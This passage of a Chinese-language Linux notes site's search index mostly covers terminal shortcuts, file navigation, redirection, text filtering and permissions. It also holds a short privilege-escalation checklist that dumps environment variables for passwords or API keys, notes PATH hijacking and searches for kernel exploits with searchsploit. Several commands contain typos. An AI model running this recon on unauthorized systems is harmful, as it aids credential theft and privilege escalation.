stacey.jenkins\n</code></pre>"},{"location":"Linux/Linux%20%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/","title":"Linux \u7cfb\u7edf\u4fe1\u606f","text":"<p>Linux \u7cfb\u7edf\u4fe1\u606f</p> <p>\u7cfb\u7edf\u4fe1\u606f</p> <p>(cat /proc/version || uname -a ) 2&gt;/dev/null lsb_release -a 2&gt;/dev/null # old, not by default on many systems cat /etc/os-release 2&gt;/dev/null # universal on modern systems</p> <p>PATH</p> <p>\u5982\u679c\u5728<code>PATH</code>\u8def\u5f84\u4e2d\u6709\u5199\u5165\u6743\u9650\uff0c\u5219\u53ef\u4ee5\u52ab\u6301\u67d0\u4e9b\u5e93\u6216\u4e8c\u8fdb\u5236\u6587\u4ef6</p> <p><code>echo $PATH</code></p> <p>Env info</p> <p>\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u6709\u8da3\u4fe1\u606f\u3001\u5bc6\u7801\u6216API\u5bc6\u94a5?</p> <p><code>(env || set) 2&gt;/dev/null</code></p> <p>Kernel exploits</p> <p>\u68c0\u67e5\u5185\u6838\u7248\u672c\uff0c\u5bfb\u627e\u5bf9\u5e94\u7248\u672c\u7684\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u5229\u7528</p> <p>cat /proc/version uname -a searchsploit \"Linux Kernel\"</p> <p>Sudo version</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/","title":"Linux\u5de5\u4f5c\u6548\u7387","text":""},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_1","title":"\u7ec8\u7aef\u5feb\u6377\u952e","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5feb\u6377\u65b9\u5f0f\u6765\u66f4\u8f7b\u677e\u3001\u66f4\u5feb\u901f\u5730\u4f7f\u7528 Linux\u3002\u5728\u6211\u4eec\u719f\u6089\u4e86\u5176\u4e2d\u6700\u91cd\u8981\u7684\u90e8\u5206\u5e76\u517b\u6210\u4e86\u4e60\u60ef\u4e4b\u540e\uff0c\u6211\u4eec\u5c06\u8282\u7701\u5927\u91cf\u7684\u6253\u5b57\u65f6\u95f4\u3002\u5176\u4e2d\u4e00\u4e9b\u751a\u81f3\u4f1a\u5e2e\u52a9\u6211\u4eec\u907f\u514d\u5728\u7ec8\u7aef\u4e2d\u4f7f\u7528\u9f20\u6807\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_2","title":"\u81ea\u52a8\u5b8c\u6210","text":"<p><code>[TAB]</code>- \u542f\u52a8\u81ea\u52a8\u5b8c\u6210\u3002\u8fd9\u5c06\u6839\u636e<code>STDIN</code>\u6211\u4eec\u63d0\u4f9b\u7684\u4e0d\u540c\u5411\u6211\u4eec\u5efa\u8bae\u4e0d\u540c\u7684\u9009\u9879\u3002\u8fd9\u4e9b\u53ef\u4ee5\u662f\u7279\u5b9a\u7684\u5efa\u8bae\uff0c\u4f8b\u5982\u6211\u4eec\u5f53\u524d\u5de5\u4f5c\u73af\u5883\u4e2d\u7684\u76ee\u5f55\u3001\u4ee5\u6211\u4eec\u5df2\u7ecf\u8f93\u5165\u7684\u76f8\u540c\u5b57\u7b26\u6570\u5f00\u5934\u7684\u547d\u4ee4\u6216\u9009\u9879\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_3","title":"\u5149\u6807\u79fb\u52a8","text":"<p><code>[CTRL] + A</code>- \u5c06\u5149\u6807\u79fb\u52a8\u5230<code>beginning</code>\u5f53\u524d\u884c\u3002</p> <p><code>[CTRL] + E</code>- \u5c06\u5149\u6807\u79fb\u52a8\u5230<code>end</code>\u5f53\u524d\u884c\u3002</p> <p><code>[CTRL] + [\u2190]</code>/\u00a0<code>[\u2192]</code>- \u5728\u5f53\u524d/\u4e0a\u4e00\u4e2a\u5355\u8bcd\u7684\u5f00\u5934\u8df3\u8f6c\u3002</p> <p><code>[ALT] + B</code>/\u00a0<code>F</code>- \u5411\u540e/\u5411\u524d\u8df3\u8f6c\u4e00\u4e2a\u5355\u8bcd\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_4","title":"\u64e6\u9664\u5f53\u524d\u884c","text":"<p><code>[CTRL] + U</code>- \u64e6\u9664\u4ece\u5149\u6807\u5f53\u524d\u4f4d\u7f6e\u5230<code>beginning</code>\u884c\u7684\u6240\u6709\u5185\u5bb9\u3002</p> <p><code>[Ctrl] + K</code>- \u64e6\u9664\u4ece\u5149\u6807\u5f53\u524d\u4f4d\u7f6e\u5230<code>end</code>\u884c\u7684\u6240\u6709\u5185\u5bb9\u3002</p> <p><code>[Ctrl] + W</code>- \u64e6\u9664\u5149\u6807\u4f4d\u7f6e\u4e4b\u524d\u7684\u5355\u8bcd\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_5","title":"\u7c98\u8d34\u5df2\u5220\u9664\u7684\u5185\u5bb9","text":"<p><code>[Ctrl] + Y</code>- \u7c98\u8d34\u5df2\u5220\u9664\u7684\u6587\u672c\u6216\u5355\u8bcd\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_6","title":"\u7ed3\u675f\u4efb\u52a1","text":"<p><code>[CTRL] + C``SIGINT</code>- \u901a\u8fc7\u53d1\u9001\u4fe1\u53f7\u7ed3\u675f\u5f53\u524d\u4efb\u52a1/\u8fdb\u7a0b\u3002\u4f8b\u5982\uff0c\u8fd9\u53ef\u4ee5\u662f\u7531\u5de5\u5177\u8fd0\u884c\u7684\u626b\u63cf\u3002\u5982\u679c\u6211\u4eec\u6b63\u5728\u89c2\u770b\u626b\u63cf\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u5feb\u6377\u65b9\u5f0f\u505c\u6b62/\u7ec8\u6b62\u6b64\u8fdb\u7a0b\u3002\u867d\u7136\u4e0d\u662f\u7531\u6211\u4eec\u4f7f\u7528\u7684\u5de5\u5177\u914d\u7f6e\u548c\u5f00\u53d1\u7684\u3002\u8be5\u8fdb\u7a0b\u5c06\u5728\u4e0d\u8981\u6c42\u6211\u4eec\u786e\u8ba4\u7684\u60c5\u51b5\u4e0b\u88ab\u7ec8\u6b62\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#eof","title":"\u6587\u4ef6\u7ed3\u675f (EOF)","text":"<p><code>[CTRL] + D</code>- \u5173\u95ed<code>STDIN</code>\u4e5f\u79f0\u4e3a\u6587\u4ef6\u7ed3\u675f (EOF) \u6216\u4f20\u8f93\u7ed3\u675f\u7684\u7ba1\u9053\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_7","title":"\u6e05\u9664\u7ec8\u7aef","text":"<p><code>[CTRL] + L</code>- \u6e05\u9664\u7ec8\u7aef\u3002\u6b64\u5feb\u6377\u65b9\u5f0f\u7684\u66ff\u4ee3\u65b9\u6cd5\u662f<code>clear</code>\u60a8\u53ef\u4ee5\u952e\u5165\u6e05\u9664\u7ec8\u7aef\u7684\u547d\u4ee4\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_8","title":"\u540e\u53f0\u8fdb\u7a0b","text":"<p><code>[CTRL] + Z``SIGTSTP</code>- \u901a\u8fc7\u53d1\u9001\u4fe1\u53f7\u6682\u505c\u5f53\u524d\u8fdb\u7a0b\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_9","title":"\u641c\u7d22\u547d\u4ee4\u5386\u53f2","text":"<p><code>[CTRL] + R</code>- \u5728\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55\u4e2d\u641c\u7d22\u6211\u4eec\u4e4b\u524d\u952e\u5165\u7684\u4e0e\u6211\u4eec\u7684\u641c\u7d22\u6a21\u5f0f\u5339\u914d\u7684\u547d\u4ee4\u3002</p> <p><code>[\u2191]</code>/\u00a0<code>[\u2193]</code>- \u8f6c\u5230\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55\u4e2d\u7684\u4e0a\u4e00\u4e2a/\u4e0b\u4e00\u4e2a\u547d\u4ee4\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_10","title":"\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5207\u6362","text":"<p><code>[ALT] + [TAB]</code>- \u5728\u6253\u5f00\u7684\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5207\u6362\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#_11","title":"\u7a97\u53e3","text":"<p><code>[CTRL] + [+]</code>- \u653e\u5927\u3002</p> <p><code>[CTRL] + [-]</code>- \u7f29\u5c0f\u3002</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87/#linux","title":"linux","text":""},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/","title":"Linux\u5de5\u4f5c\u6d41\u7a0b","text":""},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_1","title":"\u5bfc\u822a","text":"<p>\u5728 Linux \u4e2d\u5bfc\u822a\u3001\u521b\u5efa\u3001\u79fb\u52a8\u3001\u7f16\u8f91\u548c\u5220\u9664\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5e76\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u627e\u5230\u5b83\u4eec</p> <p>\u67e5\u770b\u5f53\u524d\u76ee\u5f55</p> <pre><code>$ pwd\n/home/dark\n</code></pre> <p>\u67e5\u770b\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u7684\u5185\u5bb9</p> <pre><code>$ ls\n$ ls -l /var/\n\n</code></pre> <p>\u5207\u6362\u76ee\u5f55</p> <pre><code>\u5207\u6362\u5230 /var/ \u76ee\u5f55\u4e0b\n$ cd /var/\n\u5207\u6362\u5230\u4e0a\u6b21\u6240\u5728\u76ee\u5f55\n$ cd -\n\u5207\u6362\u5230\u5bb6\u76ee\u5f55\n$ cd ~\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_2","title":"\u4f7f\u7528\u6587\u4ef6\u548c\u76ee\u5f55","text":""},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_3","title":"\u521b\u5efa\u3001\u79fb\u52a8\u548c\u590d\u5236","text":"<p>\u521b\u5efa\u6587\u4ef6</p> <pre><code>$ touch &lt;name&gt;\n</code></pre> <p>\u521b\u5efa\u76ee\u5f55</p> <pre><code>$ mkdir &lt;name&gt;\n</code></pre> <p>\u67e5\u770b\u76ee\u5f55\u7ed3\u6784</p> <pre><code>\u67e5\u770b\u5f53\u524d\u76ee\u5f55\u7ed3\u6784\n$ $ree .\n.\n\u251c\u2500\u2500 1.png\n\u251c\u2500\u2500 2.png\n</code></pre> <p>\u7f16\u8f91\u6587\u4ef6 \u7f16\u8f91\u6587\u4ef6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\u79cd\uff0c\u6700\u5e38\u89c1\u7684\u6587\u672c\u7f16\u8f91\u5668\u662f<code>vi</code> \u548c<code>vim</code> \uff0c\u7b80\u5355\u4e00\u70b9\u7684nano\u3002\u7f16\u8f91\u5668\u6307\u5b9a\u6587\u4ef6\u540d\u53ef\u76f4\u63a5\u521b\u5efa\u3002</p> <pre><code>\u521b\u5efa\u5e76\u7f16\u8f91\u6587\u4ef6 notes.txt\n$ nano notes.txt\n\n^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify     ^C Cur Pos     M-U Undo\n^X Exit        ^R Read File   ^\\ Replace     ^U Uncut Text  ^T To Spell    ^_ Go To Line  M-E Redo\n\n</code></pre> <p>^ \u4ee3\u8868 [CTRL]  [CTRL + O] \u5e76\u56de\u8f66\u786e\u8ba4 \u4fdd\u5b58 [CTRL + X] \u9000\u51fa\u7f16\u8f91</p> <p>\u67e5\u770b\u6587\u4ef6</p> <pre><code>$ cat notes.txt\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_4","title":"\u67e5\u627e\u6587\u4ef6\u548c\u76ee\u5f55","text":"<p>\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u81f3\u5173\u91cd\u8981\uff0c\u5f53\u6211\u4eec\u83b7\u53d6Linux\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u9650\u540e\uff0c\u5c31\u5fc5\u987b\u627e\u5230\u914d\u7f6e\u6587\u4ef6\u3001\u7528\u6237\u6216\u7ba1\u7406\u5458\u521b\u5efa\u7684\u811a\u672c\u4ee5\u53ca\u5176\u4ed6\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u3002</p> <p>which \u8fd4\u56de\u5e94\u6267\u884c\u6587\u4ef6\u6216\u8005\u94fe\u63a5\u7684\u8def\u5f84\uff0c\u53ef\u786e\u8ba4\u67d0\u4e9b\u5de5\u5177\u5728\u7cfb\u7edf\u4e0a\u662f\u5426\u53ef\u7528\u3002</p> <pre><code>$ which python\n/usr/bin/python\n$ which abcd\n\n</code></pre> <p>find \u67e5\u627e\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u8fc7\u6ee4\u7ed3\u679c\u3002\u8fc7\u6ee4\u53c2\u6570\uff1a\u6587\u4ef6\u5927\u5c0f\u3001\u65e5\u671f\u7b49</p> <pre><code>$ find &lt;location&gt; &lt;options&gt;\n$ find / -type f -name *.conf -user root -size +20k -vewermt 2022-09-17 -exec ls -al {} \\; 2&gt;dev/null\n</code></pre> \u9009\u9879 \u63cf\u8ff0 <code>-type f</code> \u5b9a\u4e49\u641c\u7d22\u5bf9\u8c61\u7684\u7c7b\u578b\u3002'f' \u4ee3\u8868 'file' <code>-name *conf</code> \u5b9a\u4e49\u6587\u4ef6\u540d\u79f0\uff0c<code>*</code>\u901a\u914d\u7b26\u4ee3\u8868\u4ee5.conf\u7ed3\u5c3e\u7684\u6587\u4ef6 <code>-user root</code> \u8fc7\u6ee4\u51fa\u6240\u6709\u8005\u4e3aroot\u7528\u6237\u7684\u6240\u6709\u6587\u4ef6 <code>-size +20k</code> \u67e5\u770b\u5927\u4e8e20kib\u7684\u6587\u4ef6 <code>-newermt 2022-09-17</code> \u4ec5\u663e\u793a\u6bd4\u6307\u5b9a\u65e5\u671f\u65b0\u7684\u6587\u4ef6 <code>-exec ls -al {} \\;</code> \u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff0c\u5927\u62ec\u53f7\u4f5c\u4e3a\u6bcf\u4e2a\u7ed3\u679c\u7684\u7ad9\u4f4d\u7b26\uff0c\u53cd\u659c\u6760\u4f7f\u4e0b\u4e00\u4e2a\u5b57\u7b26\u4e0d\u4f1a\u88abshell\u4f5c\u4e3a\u6307\u4ee4\u6267\u884c\uff0c\u5426\u5219\u5206\u53f7\u5c06\u7ec8\u6b62\u547d\u4ee4\u5e76\u4e14\u4e0d\u4f1a\u5230\u8fbe\u91cd\u5b9a\u5411 <code>2&gt;dev/null</code> STDERR\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230<code>null device</code>\uff0c\u786e\u4fdd\u7ec8\u7aef\u4e0d\u663e\u793a\u4efb\u4f55\u9519\u8bef\u4fe1\u606f\uff0c\u4e0d\u662f<code>find</code>\u547d\u4ee4\u7684\u9009\u9879\u3002 <p>locate</p> <pre><code>\u66f4\u65b0\u672c\u5730\u6570\u636e\u5e93\n$ sudo updatedb\n\u641c\u7d22.conf\u6269\u5c55\u540d\u6587\u4ef6\n$ locate *.conf\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_5","title":"\u6587\u4ef6\u63cf\u8ff0\u548c\u91cd\u5b9a\u5411","text":""},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_6","title":"\u6587\u4ef6\u63cf\u8ff0\u7b26","text":"<p>Unix/Linux \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26(FD)\u662f\u7531\u5185\u6838\u7ef4\u62a4\u4ee5\u6267\u884c\u8f93\u5165/\u8f93\u51fa\u64cd\u4f5c\u7684\u8fde\u63a5\u6307\u793a\u5668</p> <p>1\u3001\u8f93\u5165\u6570\u636e\u6d41 <code>STDIN - 0</code> 2\u3001\u8f93\u51fa\u6570\u636e\u6d41 <code>STDOUT - 1</code> 3\u3001\u4e0e\u53d1\u751f\u9519\u8bef\u76f8\u5173\u7684\u8f93\u51fa\u6570\u636e\u6d41 <code>STDERR - 2</code></p> <pre><code>\u8ba4\u8bc6\u6807\u51c6\u8f93\u5165\u548c\u6807\u51c6\u8f93\u51fa\n$ cat \nI am j    #\u6807\u51c6\u8f93\u5165\nI am j    #\u6807\u51c6\u8f93\u51fa\n\u8ba4\u8bc6\u6807\u51c6\u9519\u8bef\n$ find /etc/ -name shadow\nfind: '/etc/dovecot/private': Permission denied  #\u6807\u51c6\u9519\u8bef'Permission denied'\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_7","title":"\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411","text":"<pre><code>\u5c06\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u81f3 /dev/null \u7b49\u4e8e\u4e22\u5f03\n$ find /etc/ -name shadow 2&gt;/dev/null\n\n\u5c06\u6807\u51c6\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u672c\u6587\u4ef6\n$ find /etc/ -name shadow 2&gt;/dev/mull &gt; results.txt\n\u5c06\u6807\u51c6\u8f93\u51fa\u91cd\u5b9a\u5411\u7ed9grep\n$ find /etc/ -name *.conf 2&gt;/dev/null | grep systemd\n\u6807\u51c6\u8f93\u51fa\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u4e0d\u540c\u6587\u4ef6\n$ find /etc/ -name shadow 2&gt;stderr.txt &gt; stdout.txt\n\u5c06\u6807\u51c6\u8f93\u51fa\u8ffd\u52a0\u5230stdout.txt\uff0c\u800c\u4e0d\u662f\u8986\u76d6\u6587\u4ef6\u5185\u5bb9\n$ find /etc/ -name passwd &gt;&gt; stdout.txt 2&gt;/dev/null\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_8","title":"\u6807\u51c6\u8f93\u5165\u91cd\u5b9a\u5411","text":"<pre><code>\u5c06 stdout.txt \u7684\u6587\u4ef6\u5185\u5bb9\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165\n$ cat &lt; stdout.txt\n\n\u5c06\u6807\u51c6\u8f93\u5165\u6d41\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0cEOF\u51fd\u6570\u5b9a\u4e49\u4e86\u8f93\u5165\u7684\u7ed3\u675f\n$ cat &lt;&lt; EOF &gt; stream.txt\n\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_9","title":"\u5185\u5bb9\u8fc7\u6ee4","text":"<pre><code>\u9875\u9762\u5f62\u5f0f\u6d4f\u89c8\u6587\u672c\u6587\u4ef6\n$ more /etc/passwd\n$ less /etc/passwd  #\u6587\u672c\u4e0d\u4f1a\u4fdd\u7559\u5728\u7ec8\u7aef\n\n\u67e5\u770b\u6587\u672c\u6587\u4ef6\u7684\u90e8\u5206\u4fe1\u606f\n$ head /etc/passwd  #\u9ed8\u8ba4\u663e\u793a\u524d10\u884c\n$ tail /etc/passwd  #\u9ed8\u8ba4\u663e\u793a\u6700\u540e10\u884c\n\n\u7ed9\u8f93\u51fa\u5185\u5bb9\u6392\u5e8f\n$ cat /etc/passwd | sort  #\u9ed8\u8ba4\u5b57\u6bcd\u987a\u5e8f\n\n\u4f7f\u7528\u5206\u9694\u7b26\u8fdb\u884c\u5206\u9694\n$ cat /etc/passwd | grep -v \"false\\|nologin\" | cut -d\":\" -f1\n\n\u66ff\u6362\n$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \"  #\u5c06 \":\" \u66ff\u6362\u6210\u7a7a\u683c\n\n\u4ee5\u8868\u683c\u5f62\u5f0f\u663e\u793a\n$ cat /etc/passwd | column -t\n\n\u6307\u5b9a\u8981\u663e\u793a\u7684\u884c\n$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" | awk '{print $1, $NF}'  #\u5c55\u793a\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\n\nsed \u66ff\u6362 regex\u67e5\u627e \u5e76\u66ff\u6362\n$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" | awk '{print $1, $NF}' | sed 's/bin/HTB/g'  #s\u4ee3\u8868\u66ff\u6362\u547d\u4ee4 g\u4ee3\u8868\u66ff\u6362\u6240\u6709\u5339\u914d\u9879\n\n\u8ba1\u6570 \u884c\u6570\nwc -l \n\n\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_10","title":"\u6743\u9650\u7ba1\u7406","text":"<p>Linux \u4e2d\u6bcf\u4e2a\u6587\u4ef6\u548c\u76ee\u5f55\u90fd\u5c5e\u4e8e\u7279\u5b9a\u7528\u6237\u548c\u7279\u5b9a\u7ec4\uff0c\u6bcf\u4e2a\u7528\u6237\u548c\u7ec4\u521b\u5efa\u7684\u6587\u4ef6\u90fd\u5f52\u5c5e\u4e8e\u81ea\u5df1\u3002\u5206\u4e3a\u4e09\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u6743\u9650 <code>r</code>(\u8bfb), <code>w</code>(\u5199), <code>x</code>(\u6267\u884c)\uff0c\u5206\u522b\u8d4b\u7ed9<code>owner</code>(\u5f53\u524d\u7528\u6237), <code>group</code>(\u5f53\u524d\u7528\u6237\u6240\u5c5e\u7ec4), <code>others</code>(\u5176\u4ed6\u7528\u6237\u6216\u7ec4) \u89d2\u8272\u3002</p> <pre><code>$ ls -l /etc/passwd\n\n- rwx rw- r--   1 root root 1641 May  4 23:42 /etc/passwd\n- --- --- ---   |  |    |    |   |__________|\n|  |   |   |    |  |    |    |        |_ Date\n|  |   |   |    |  |    |    |__________ File Size\n|  |   |   |    |  |    |_______________ Group\n|  |   |   |    |  |____________________ User\n|  |   |   |    |_______________________ Number of hard links\n|  |   |   |_ \u5176\u4ed6\u7528\u6237\u7ec4\u6743\u9650 (read)\n|  |   |_____ \u7ec4\u6743\u9650 (read, write)\n|  |_________ \u7528\u6237\u6743\u9650 (read, write, execute)\n|____________ \u6587\u4ef6\u7c7b\u578b (- = File, d = Directory, l = Link, ... )\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_11","title":"\u66f4\u6539\u6743\u9650","text":"<p>\u8bbe\u7f6e <code>owner</code>, <code>group</code>, <code>others</code> \u6743\u9650</p> <pre><code>$ ls -l text\n-rw-r----x 1 root root 0 Sep 22 15:58 text\n\n$ chmod a+r text &amp;&amp; ls -l text  #\u7ed9\u6240\u7528\u89d2\u8272\u5206\u914d\u8bfb\u6743\u9650\n-rw-r--r-- 1 root root 0 Sep 22 15:58 text\n$ chmod 754 text &amp;&amp; ls -l text  #8\u8fdb\u5236\u5206\u914d\n-rwxr-xr-- 1 root root 0 Sep 22 15:58 text\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#_12","title":"\u66f4\u6539\u6240\u6709\u8005","text":"<pre><code>\u8bed\u6cd5\n$ chown &lt;user&gt;:&lt;group&gt; &lt;file/directory&gt;\n</code></pre>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#suid-guid","title":"SUID &amp; GUID","text":"<p>https://cloud.tencent.com/developer/article/1728129</p>"},{"location":"Linux/Linux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/#linux","title":"linux","text":""},{"location":"Linux/Linux%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%20cheat%20sheep/","title":"Linux\u5e38\u7528\u914d\u7f6e cheat sheep","text":"<p>apt \u5b89\u88c5 docker\uff0c\u4f7f\u7528\u963f\u91cc\u4e91\u955c\u50cf\u52a0\u901f\u5668 pull v2raya\uff0c\u5bfc\u5165\u8ba2\u9605\u94fe\u63a5 \u89e3\u9664\u5c01\u5370</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/","title":"Linux\u7cfb\u7edf\u7ba1\u7406","text":""},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_1","title":"\u7528\u6237\u7ba1\u7406","text":"<p>\u7528\u6237\u7ba1\u7406\u662f Linux \u7ba1\u7406\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u6709\u65f6\u6211\u4eec\u9700\u8981\u521b\u5efa\u65b0\u7528\u6237\u6216\u5c06\u5176\u4ed6\u7528\u6237\u6dfb\u52a0\u5230\u7279\u5b9a\u7ec4\u3002\u53e6\u4e00\u79cd\u53ef\u80fd\u6027\u662f\u4f5c\u4e3a\u4e0d\u540c\u7684\u7528\u6237\u6267\u884c\u547d\u4ee4\u3002\u6bd5\u7adf\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u5b9a\u7ec4\u7684\u7528\u6237\u6709\u6743\u67e5\u770b\u6216\u7f16\u8f91\u7279\u5b9a\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002\u53cd\u8fc7\u6765\uff0c\u8fd9\u4f7f\u6211\u4eec\u80fd\u591f\u5728\u673a\u5668\u4e0a\u672c\u5730\u6536\u96c6\u66f4\u591a\u4fe1\u606f\uff0c\u8fd9\u53ef\u80fd\u975e\u5e38\u91cd\u8981\u3002</p> <p>\u547d\u4ee4 |  \u63cf\u8ff0 --- | --- | <code>sudo</code> | \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002 <code>su</code>  | \u8be5<code>su</code>\u5b9e\u7528\u7a0b\u5e8f\u901a\u8fc7 PAM \u8bf7\u6c42\u9002\u5f53\u7684\u7528\u6237\u51ed\u636e\u5e76\u5207\u6362\u5230\u8be5\u7528\u6237 ID\uff08\u9ed8\u8ba4\u7528\u6237\u662f\u8d85\u7ea7\u7528\u6237\uff09\u3002\u7136\u540e\u6267\u884c\u4e00\u4e2ashell\u3002 <code>useradd</code> | \u521b\u5efa\u65b0\u7528\u6237\u6216\u66f4\u65b0\u9ed8\u8ba4\u7684\u65b0\u7528\u6237\u4fe1\u606f\u3002 <code>userdel</code>  | \u5220\u9664\u7528\u6237\u5e10\u6237\u548c\u76f8\u5173\u6587\u4ef6\u3002 <code>usermod</code> | \u4fee\u6539\u7528\u6237\u5e10\u6237\u3002 <code>groupadd</code>  | \u5c06\u7ec4\u6dfb\u52a0\u5230\u7cfb\u7edf\u3002 <code>groupdel</code>  | \u4ece\u7cfb\u7edf\u4e2d\u5220\u9664\u4e00\u4e2a\u7ec4\u3002 <code>passwd</code>  | \u66f4\u6539\u7528\u6237\u5bc6\u7801\u3002</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#useradd","title":"useradd","text":"<p>$ useradd [\u9009\u9879] [\u7528\u6237\u540d]</p> <ul> <li> <p>\u9009\u9879</p> <ul> <li> <p><code>-b</code> \u521b\u5efa\u7528\u6237\u7684\u540c\u65f6\u521b\u5efa\u5bb6\u76ee\u5f55</p> </li> <li> <p><code>-c</code> \u6dfb\u52a0\u6ce8\u91ca</p> </li> <li> <p><code>-d</code> \u6307\u5b9a\u7528\u6237\u5bb6\u76ee\u5f55\uff0c\u5982\u8def\u5f84\u4e0d\u5b58\u5728\u6dfb\u52a0 <code>-m</code> \u76f4\u63a5\u521b\u5efa</p> </li> <li> <p><code>-g</code> \u6307\u5b9a\u7528\u6237\u6240\u5c5e\u7ec4</p> </li> <li> <p><code>-G</code> \u6307\u5b9a\u7528\u6237\u9644\u52a0\u7ec4</p> </li> <li> <p><code>-s</code> \u6307\u5b9a\u7528\u6237\u7684\u767b\u5f55 shell, \u6307\u5b9a shell \u6839\u8def\u5f84</p> </li> <li> <p><code>-u</code> \u6307\u5b9a\u7528\u6237 uid \uff0c<code>-o</code> \u9009\u9879\u53ef\u4e0e\u5df2\u6709\u7528\u6237\u91cd\u590d</p> </li> </ul> </li> <li> <p>\u7528\u6237\u540d</p> </li> </ul>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#userdel","title":"userdel","text":"<p>$ userdel [\u9009\u9879] [\u7528\u6237\u540d] $ userdel -r  dark 